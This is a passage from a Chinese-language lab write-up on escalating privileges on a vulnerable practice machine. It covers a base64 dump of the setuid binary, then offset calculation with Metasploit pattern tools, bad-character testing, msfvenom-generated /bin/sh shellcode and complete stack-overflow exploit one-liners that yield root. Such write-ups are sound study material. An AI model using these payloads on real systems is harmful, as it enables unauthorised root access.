    AAAAAGYQAAAVAQAAAAAAAAAAAAABAAAAAAAAABcBAAABAAAAAAAAAAAAAAB7EQAAtwAAAAAAAAAA
    AAAAAQAAAAAAAAAlAQAAAQAAAAAAAAAAAAAAMhIAAEoAAAAAAAAAAAAAAAEAAAAAAAAAMQEAAAEA
    AAAwAAAAAAAAAHwSAACIAAAAAAAAAAAAAAABAAAAAQAAADwBAAABAAAAAAAAAAAAAAAEEwAAOAAA
    AAAAAAAAAAAAAQAAAAAAAAARAAAAAwAAAAAAAAAAAAAAPBMAAEcBAAAAAAAAAAAAAAEAAAAAAAAA
    AQAAAAIAAAAAAAAAAAAAACQaAACQBAAAIwAAADMAAAAEAAAAEAAAAAkAAAADAAAAAAAAAAAAAAC0
    HgAAHQIAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFSBBAgAAAAAAwABAAAA
    AABogQQIAAAAAAMAAgAAAAAAiIEECAAAAAADAAMAAAAAAKyBBAgAAAAAAwAEAAAAAADMgQQIAAAA
    AAMABQAAAAAAPIIECAAAAAADAAYAAAAAAJSCBAgAAAAAAwAHAAAAAACkggQIAAAAAAMACAAAAAAA
    xIIECAAAAAADAAkAAAAAAMyCBAgAAAAAAwAKAAAAAAD0ggQIAAAAAAMACwAAAAAAMIMECAAAAAAD
    AAwAAAAAAJCDBAgAAAAAAwANAAAAAABchQQIAAAAAAMADgAAAAAAeIUECAAAAAADAA8AAAAAAJSF
    BAgAAAAAAwAQAAAAAADIhQQIAAAAAAMAEQAAAAAAFJ8ECAAAAAADABIAAAAAAByfBAgAAAAAAwAT
    AAAAAAAknwQIAAAAAAMAFAAAAAAAKJ8ECAAAAAADABUAAAAAAPCfBAgAAAAAAwAWAAAAAAD0nwQI
    AAAAAAMAFwAAAAAAFKAECAAAAAADABgAAAAAABygBAgAAAAAAwAZAAAAAAAAAAAAAAAAAAMAGgAA
    AAAAAAAAAAAAAAADABsAAAAAAAAAAAAAAAAAAwAcAAAAAAAAAAAAAAAAAAMAHQAAAAAAAAAAAAAA
    AAADAB4AAAAAAAAAAAAAAAAAAwAfAAAAAAAAAAAAAAAAAAMAIAABAAAAAAAAAAAAAAAEAPH/DAAA
    ABSfBAgAAAAAAQASABoAAAAcnwQIAAAAAAEAEwAoAAAAJJ8ECAAAAAABABQANQAAAMCDBAgAAAAA
    AgANAEsAAAAcoAQIAQAAAAEAGQBaAAAAIKAECAQAAAABABkAaAAAACCEBAgAAAAAAgANAAEAAAAA
    AAAAAAAAAAQA8f90AAAAGJ8ECAAAAAABABIAgQAAAIiGBAgAAAAAAQARAI8AAAAknwQIAAAAAAEA
    FACbAAAAMIUECAAAAAACAA0AsQAAAAAAAAAAAAAABADx/7cAAAAUnwQIAAAAAAAAEgDIAAAAKJ8E
    CAAAAAABABUA0QAAABSfBAgAAAAAAAASAOQAAAD0nwQIAAAAAAEAFwD6AAAAIIUECAIAAAASAA0A
    CgEAACKFBAgAAAAAEgINACEBAAAUoAQIAAAAACAAGAAsAQAAAAAAAAAAAAASAAAAPgEAABygBAgA
    AAAAEADx/0UBAABchQQIAAAAABIADgBLAQAAAAAAAAAAAAASAAAAXQEAACCfBAgAAAAAEQITAGoB
    AAAUoAQIAAAAABAAGAB3AQAAAAAAAAAAAAAgAAAAhgEAAAAAAAAAAAAAEgAAAJYBAAAYoAQIAAAA
    ABECGACjAQAAfIUECAQAAAARAA8AsgEAAAAAAAAAAAAAEgAAAM8BAACwhAQIYQAAABIADQDfAQAA
    JKAECAAAAAAQAPH/5AEAAJCDBAgAAAAAEgANAOsBAAB4hQQIBAAAABEADwDyAQAAHKAECAAAAAAQ
    APH//gEAAESEBAhjAAAAEgANAAMCAAAAAAAAAAAAACAAAAAXAgAA9IIECAAAAAASAAsAAGNydHN0
    dWZmLmMAX19DVE9SX0xJU1RfXwBfX0RUT1JfTElTVF9fAF9fSkNSX0xJU1RfXwBfX2RvX2dsb2Jh
    bF9kdG9yc19hdXgAY29tcGxldGVkLjYxNTkAZHRvcl9pZHguNjE2MQBmcmFtZV9kdW1teQBfX0NU
    T1JfRU5EX18AX19GUkFNRV9FTkRfXwBfX0pDUl9FTkRfXwBfX2RvX2dsb2JhbF9jdG9yc19hdXgA
    Ym9mLmMAX19pbml0X2FycmF5X2VuZABfRFlOQU1JQwBfX2luaXRfYXJyYXlfc3RhcnQAX0dMT0JB
    TF9PRkZTRVRfVEFCTEVfAF9fbGliY19jc3VfZmluaQBfX2k2ODYuZ2V0X3BjX3RodW5rLmJ4AGRh
    dGFfc3RhcnQAcHJpbnRmQEBHTElCQ18yLjAAX2VkYXRhAF9maW5pAHN0cmNweUBAR0xJQkNfMi4w
    AF9fRFRPUl9FTkRfXwBfX2RhdGFfc3RhcnQAX19nbW9uX3N0YXJ0X18AZXhpdEBAR0xJQkNfMi4w
    AF9fZHNvX2hhbmRsZQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4w
    AF9fbGliY19jc3VfaW5pdABfZW5kAF9zdGFydABfZnBfaHcAX19ic3Nfc3RhcnQAbWFpbgBfSnZf
    UmVnaXN0ZXJDbGFzc2VzAF9pbml0AA=
    ```
    
    然后复制到本地命名为`base64.txt`
    
    base64解码
    
    ```python
    base64 base64.txt -d > r00t
    ```
    
    然后生成md5和靶机的md5对比，一模一样
    
    ```python
    0e1049b1040b0598a364f33de29cc2a7  r00t
    ```
    

## 缓冲区溢出漏洞利用

1. checksec查看保护机制，没有保护
    
    ```python
    gdb-peda$ checksec r00t
    CANARY    : disabled
    FORTIFY   : disabled
    NX        : disabled
    PIE       : disabled
    RELRO     : Partial
    ```
    
2. 计算偏移量
    
    使用pattern生成不重复字符串（用的是msf的，gdb自带的会产生括号）
    
    ```python
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
    //
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
    ```
    
    放到程序里
    
    ```python
    gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
    //
    rogram received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x12c 
    EBX: 0xf7f95e14 --> 0x227d0c ('\x0c}"')
    ECX: 0x0 
    EDX: 0x0 
    ESI: 0x80484b0 (<__libc_csu_init>:      push   ebp)
    EDI: 0xf7ffcb60 --> 0x0 
    EBP: 0x41386941 ('Ai8A')
    ESP: 0xffffce70 ("0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")
    EIP: 0x6a413969 ('i9Aj')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    ```
    
    `EIP`被`i9Aj`覆盖，使用offset得出偏移量
    
    ```python
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q i9Aj
    [*] Exact match at offset 268
    ```
    
    得出偏移量`268`
    
3. 查看一下利用的ESP `0xffffd350` ，小端取反就是 `'\x50\xd3\xff\xff'`
4. 利用思路：`eip`覆盖为`esp`的地址，然后`esp`放入`shellcode`
5. 坏字节判断
    
    [https://github.com/cytopia/badchars](https://github.com/cytopia/badchars)
    
    坏字节字典，放到`esp`区域提交
    
    ```python
    gdb-peda$ r $(python -c "print('A'*268+'b'*4+'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')")
    ```
    
    然后使用 `x/256b $esp` `x/256x $esp` 和坏字节字典进行对比，如果某个字节后面跟着的是`0x00` ，就表示那个字节后面那个是坏字节，把它删掉后再放进放到`esp`区域提交，以此类推，当`x/256b $esp` `x/256x $esp` 显示的是连续的中间没有0x00就表示剔除干净了
    
    发现的坏字节：`\x00 \x0a \x0b \x09 \x20`
    
6. 使用msfvenom生成shellcode
    
    ```python
    **msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x20' -e x86/shikata_ga_nai -fc
    //**
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 70 (iteration=0)
    x86/shikata_ga_nai chosen with final size 70
    Payload size: 70 bytes
    Final size of c file: 319 bytes
    unsigned char buf[] = 
    "\xd9\xd0\xd9\x74\x24\xf4\xbb\x19\x0d\x8d\xc3\x5e\x31\xc9"
    "\xb1\x0b\x83\xee\xfc\x31\x5e\x16\x03\x5e\x16\xe2\xec\x67"
    "\x86\x9b\x97\x2a\xfe\x73\x8a\xa9\x77\x64\xbc\x02\xfb\x03"
    "\x3c\x35\xd4\xb1\x55\xab\xa3\xd5\xf7\xdb\xbc\x19\xf7\x1b"
    "\x92\x7b\x9e\x75\xc3\x08\x08\x8a\x4c\xbc\x41\x6b\xbf\xc2"
    ```
    
    payload
    
    ```python
    ./r00t $(python -c 'print "A"*268 + "\x50\xd3\xff\xff" + "\x90"*20 + "\xd9\xd0\xd9\x74\x24\xf4\xbb\x19\x0d\x8d\xc3\x5e\x31\xc9\xb1\x0b\x83\xee\xfc\x31\x5e\x16\x03\x5e\x16\xe2\xec\x67\x86\x9b\x97\x2a\xfe\x73\x8a\xa9\x77\x64\xbc\x02\xfb\x03\x3c\x35\xd4\xb1\x55\xab\xa3\xd5\xf7\xdb\xbc\x19\xf7\x1b\x92\x7b\x9e\x75\xc3\x08\x08\x8a\x4c\xbc\x41\x6b\xbf\xc2"')
    // 这里我死活提不了权，网上找了别人的payload发现可以提权，主要原因是ESP的地址不同
    **./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90"*20 +** "\xba\x19\xb3\xb8\x79\xdb\xde\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x0b\x31\x55\x15\x83\xed\xfc\x03\x55\x11\xe2\xec\xd9\xb3\x21\x97\x4c\xa2\xb9\x8a\x13\xa3\xdd\xbc\xfc\xc0\x49\x3c\x6b\x08\xe8\x55\x05\xdf\x0f\xf7\x31\xd7\xcf\xf7\xc1\xc7\xad\x9e\xaf\x38\x41\x08\x30\x10\xf6\x41\xd1\x53\x78"')
    // 明明做法是一样的，不过我注意到我的esi和edx也有数据，不知道是不是影响ESP
    ```
    
    提权后是root权限，root目录下就是Proof.txt文件
    
    ```python
    cat Proof.txt
    You win this time young Jedi...
    
    a70354f0258dcc00292c72aab3c8b1e4
    ```
    

## 总结

缓冲区溢出难，没理解完